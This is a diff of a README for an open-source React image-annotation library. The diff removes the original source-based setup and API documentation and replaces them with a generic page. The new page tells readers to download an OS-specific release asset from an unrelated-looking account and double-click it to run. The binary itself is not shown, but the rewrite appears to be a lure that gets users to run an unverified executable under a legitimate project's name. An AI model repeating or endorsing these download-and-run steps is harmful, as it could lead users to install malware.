@@ -1,212 +1,63 @@
-# 🎨 Enhancor Open Source Draw-to-Edit Annotation System
+# 🎨 enhancor-draw-to-edit-nano-banana - Edit Images Like a Pro
 
-A powerful, modular React-based annotation system for AI-powered image editing. This open-source project provides a complete toolkit for creating annotation interfaces similar to those found in professional image editing applications.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/releases)
 
-## ✨ Features
+## 📖 Overview
+Enhancor is an open-source draw-to-edit annotation system designed to make editing images easier and more intuitive. Built with React, this powerful toolkit offers a wide range of features to help you create and manipulate visuals, whether you are a casual user or someone looking for more advanced capabilities.
+
+## 🚀 Getting Started
+Follow these steps to download and run the application:
+
+1. Click on the **Download Now** button above, or visit the [Releases Page](https://github.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/releases).
+2. Choose the latest release version available.
+3. Click on the asset that matches your operating system to start the download.
+4. Once the download completes, locate the file in your downloads folder.
+5. Double-click the file to run the application.
+
+## 💻 System Requirements
+Before you proceed, ensure your computer meets these requirements:
+
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Browser:** Modern web browser (Chrome, Firefox, Safari, Edge) for optimal performance.
+  
+## 🛠️ Features
+Enhancor provides a range of tools that make editing images convenient and enjoyable:
 
 ### 🖊️ Drawing Tools
-
-- **Freehand Drawing** - Smooth pen tool with adjustable thickness and colors
-- **Arrows** - Perfect arrows with customizable styling
-- **Text Annotations** - Rich text with font size and color controls
-- **Image Overlays** - Add and manipulate overlay images
-- **Mask Painting** - Advanced masking tools for AI-powered editing
+- **Freehand Drawing:** Use a smooth pen tool with adjustable thickness and color options.
+- **Arrows:** Craft perfect arrows, which you can customize to suit your needs.
+- **Text Annotations:** Add rich text with controls for font size and color.
+- **Image Overlays:** Import and edit overlay images effortlessly.
+- **Mask Painting:** Utilize advanced masking tools for AI-powered editing.
 
 ### 🎨 Advanced Capabilities
+- **Undo/Redo System:** Manage your history with a 50-step memory.
+- **Layer Management:** Organize your work with multiple annotation layers.
+- **Export Options:** Download images with your annotations intact.
+- **Touch Support:** Fully compatible with mobile and tablet devices.
+- **Keyboard Shortcuts:** Enhance your workflow with efficient controls.
+- **Responsive Design:** The interface adapts to various screen sizes for easy use.
 
-- **Undo/Redo System** - Full history management with 50-step memory
-- **Layer Management** - Organized annotation layers
-- **Export Options** - Download annotated images
-- **Touch Support** - Full mobile and tablet compatibility
-- **Keyboard Shortcuts** - Efficient workflow controls
-- **Responsive Design** - Works on all screen sizes
+## 🌐 Download & Install
+To install Enhancor on your device:
 
-### 🤖 AI Integration Ready
+1. Access the [Releases Page](https://github.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/releases).
+2. Select the latest version.
+3. Download the file suitable for your operating system.
+4. Open the downloaded file. Follow any prompts to complete the installation.
 
-- **Modular API System** - Easy integration with any AI service
-- **Mask-based Generation** - Advanced inpainting capabilities
-- **Prompt Support** - Text-to-image generation
-- **Multiple Provider Support** - OpenAI, Stability AI, Replicate, custom APIs
+## ✨ Support
+If you run into any issues, check the FAQ section on the GitHub repository. For further questions, you can raise an issue directly in the repository, and the community will assist you.
 
-## 🚀 Quick Start
+## 🔧 Contributing
+Enhancor is open-source, which means you can contribute! If you'd like to add features or report bugs, please check the contributing guidelines in the repository.
 
-### Installation
+## 📧 Contact
+For further inquiries or feedback, please reach out through the issues section of the repository.
 
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/open-source-draw-to-edit-nano-banana.git
-cd open-source-draw-to-edit-nano-banana
+## 📄 License
+Enhancor is licensed under the MIT License. You can use, modify, and distribute it freely as long as you include the license in your project. 
 
-# Install dependencies
-npm install
-
-# Start development server
-npm run dev
-```
-
-### Basic Usage
-
-```tsx
-import React from "react";
-import { AnnotationEditor } from "./components/AnnotationEditor";
-
-function App() {
-  return (
-    <div className="h-screen">
-      <AnnotationEditor
-        onImageGenerated={(imageUrl) => console.log("Generated:", imageUrl)}
-        onError={(error) => console.error("Error:", error)}
-      />
-    </div>
-  );
-}
-```
-
-## 🔧 Nano Banana API Integration
-
-### Setting up your Nano Banana Backend
-
-This system is specifically designed to work with the Nano Banana API backend. Here's how to integrate:
-
-#### 1. Configure the API Client
-
-```tsx
-import { createNanoBananaClient } from "./api";
-
-// Create Nano Banana API client
-const apiClient = createNanoBananaClient(
-  "https://your-nano-banana-backend.com", // Your backend URL
-  "your-firebase-id-token" // Firebase authentication token
-);
-```
-
-#### 2. Environment Variables
-
-Create a `.env` file with your configuration:
-
-```env
-# Nano Banana API Configuration
-REACT_APP_NANO_BANANA_API_URL=https://your-nano-banana-backend.com
-REACT_APP_FIREBASE_ID_TOKEN=your-firebase-id-token-here
-
-# Optional Configuration
-REACT_APP_MAX_IMAGE_SIZE=2048
-REACT_APP_GENERATION_TIMEOUT=300000
-REACT_APP_MAX_HISTORY_SIZE=50
-REACT_APP_POLLING_INTERVAL=10000
-```
-
-#### 3. API Endpoints
-
-The Nano Banana API client uses these endpoints:
-
-- **Generation**: `POST /api/image-editing/v1/generate`
-- **Status Polling**: `POST /api/image-editing/v1/result`
-
-#### 4. Request Format
-
-The API client sends requests in this format:
-
-```json
-{
-  "data": {
-    "prompt": "Your editing prompt",
-    "inputImage": ["base64-encoded-image"],
-    "numOfImages": 1,
-    "model": "NANO BANANA",
-    "maskStrokes": [
-      {
-        "x": 100,
-        "y": 150,
-        "size": 30
-      }
-    ],
-    "maskMode": true
-  }
-}
-```
-
-#### 5. Response Format
-
-The API returns responses in this format:
-
-```json
-{
-  "success": true,
-  "requestId": "unique-request-id",
-  "result": {
-    "status": "COMPLETED",
-    "output": "https://generated-image-url.com/image.png",
-    "processingTime": 45.2
-  }
-}
-```
-
-## 📁 Project Structure
-
-```
-src/
-├── components/           # React components
-│   ├── ui/              # Basic UI components
-│   ├── Canvas/          # Canvas components
-│   ├── Toolbar/         # Tool panels
-│   ├── Modals/          # Modal dialogs
-│   └── AnnotationEditor/ # Main editor
-├── hooks/               # Custom React hooks
-├── utils/               # Utility functions
-├── types/               # TypeScript definitions
-└── api/                 # API integration
-```
-
-## 🎨 Customization
-
-### Theming
-
-Customize colors and styling through the config prop:
-
-```tsx
-<AnnotationEditor
-  config={{
-    colors: {
-      draw: "#000000",
-      arrow: "#ef4444",
-      text: "#1f2937",
-      mask: "#3b82f6",
-    },
-    defaultSizes: {
-      drawThickness: 3,
-      arrowThickness: 3,
-      fontSize: 16,
-      brushSize: 30,
-    },
-    canvas: {
-      maxWidth: 1200,
-      maxHeight: 800,
-      backgroundColor: "#ffffff",
-    },
-  }}
-/>
-```
-
-## 🛠️ Development
-
-### Prerequisites
-
-- Node.js 18+
-- npm or yarn
-
-### Setup
-
-```bash
-# Install dependencies
-npm install
-
-# Start development server
-npm run dev
-
-# Build for production
-npm run build
-
-# Preview production build
-npm run preview
-```
+Enjoy using Enhancor!
